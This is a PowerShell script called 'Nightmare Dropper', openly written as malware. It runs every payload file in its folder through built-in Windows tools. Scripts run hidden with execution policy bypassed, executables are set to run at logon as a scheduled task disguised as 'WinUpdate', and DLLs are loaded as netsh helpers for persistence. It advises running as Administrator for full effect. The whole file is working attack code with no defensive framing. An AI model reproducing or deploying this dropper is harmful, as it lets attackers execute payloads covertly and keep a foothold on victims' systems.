# dropper.ps1
# ------------
# Nightmare Dropper: Executes all payloads in the current folder using LOLBins.
# Usage: Place this script and payloads in the same directory. Run as Administrator for full effect.

# --- Configuration ---
$dropperDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$payloads = Get-ChildItem -Path $dropperDir -File -Include *.ps1,*.exe,*.dll,*.bat,*.cmd,*.7z,*.zip,*.jpg,*.png,*.pdf,*.mp3,*.mp4,*.txt,*.rtf,*.gif,*.img,*.cuc,*.tar,*.rar

# --- Function: Use LOLBins to execute payloads ---
function Invoke-LOLBins {
    param(
        [string]$PayloadPath
    )
    $ext = [System.IO.Path]::GetExtension($PayloadPath).ToLower()
    switch ($ext) {
        '.ps1' { 
            Write-Host "[LOLBIN] Executing PowerShell script: $PayloadPath"
            Start-Process powershell.exe -ArgumentList "-ep bypass -file `"$PayloadPath`"" -WindowStyle Hidden
        }
        '.exe' {
            Write-Host "[LOLBIN] Executing EXE: $PayloadPath via schtasks.exe"
            schtasks.exe /create /tn "WinUpdate" /tr $PayloadPath /sc onlogon /f | Out-Null
            schtasks.exe /run /tn "WinUpdate" | Out-Null
        }
        '.dll' {
            Write-Host "[LOLBIN] Loading DLL: $PayloadPath via netsh.exe"
            netsh.exe add helper $PayloadPath
        }
        '.bat' { 
            Write-Host "[LOLBIN] Executing BAT: $PayloadPath via cmd.exe"
            cmd.exe /c $PayloadPath
        }
        '.cmd' {
            Write-Host "[LOLBIN] Executing CMD: $PayloadPath via cmd.exe"
            cmd.exe /c $PayloadPath
        }
        default {
            Write-Host "[LOLBIN] Skipping unsupported file: $PayloadPath"
        }
    }
}

# --- Main Logic ---
Write-Host "[*] Nightmare Dropper using LOLBins and chaining all payloads in folder..."
foreach ($payload in $payloads) {
    try {
        Invoke-LOLBins -PayloadPath $payload.FullName
    } catch {
        Write-Host "[!] Error executing $($payload.FullName): $_"
    }
}
Write-Host "[*] Dropper execution completed."
